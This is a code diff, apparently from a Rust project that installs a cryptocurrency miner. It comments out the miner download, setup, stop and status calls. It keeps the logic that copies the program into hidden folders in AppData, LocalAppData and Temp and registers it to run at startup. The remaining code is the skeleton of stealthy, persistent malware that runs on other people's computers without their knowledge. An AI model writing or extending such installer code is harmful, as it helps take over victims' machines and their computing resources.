@@ -6,8 +6,8 @@ use crate::common::constants::get_launcher_script_name;
 use crate::utils::files::copy_dir_recursive;
 use crate::utils::paths::{get_all_install_dirs, set_hidden_recursive, get_userprofile};
 use crate::host::process;
-use crate::modules::miner::stop_mining;
-use crate::modules::miner::{install as miner_install, status as miner_status};
+// use crate::modules::miner::stop_mining;
+// use crate::modules::miner::{install as miner_install, status as miner_status};
 use crate::host::registry::{add_to_startup, remove_from_startup};
 
 pub fn install() -> Result<(), Box<dyn std::error::Error>> {
@@ -22,7 +22,7 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
     // 1. Prepare Initial Staging Area (Temp)
     // Delegate mining setup to Miner Module
     // This handles Download, Extract, Rename, Config
-    miner_install::prepare_miner(&staging_dir)?;
+    // miner_install::prepare_miner(&staging_dir)?;
 
     // 2. Distribute to ALL locations (AppData, LocalAppData, Temp)
     let install_dirs = get_all_install_dirs();
@@ -106,7 +106,7 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 pub fn uninstall() -> Result<(), Box<dyn std::error::Error>> {
-    stop_mining()?;
+    // stop_mining()?;
     remove_from_startup()?;
     
     // Remove all install directories
@@ -145,10 +145,10 @@ pub fn start() -> Result<(), Box<dyn std::error::Error>> {
 
 #[cfg(windows)]
 pub fn status() {
-    miner_status::check_status();
+    // miner_status::check_status();
 }
 
 #[cfg(not(windows))]
 pub fn status() {
-    miner_status::check_status();
+    // miner_status::check_status();
 }
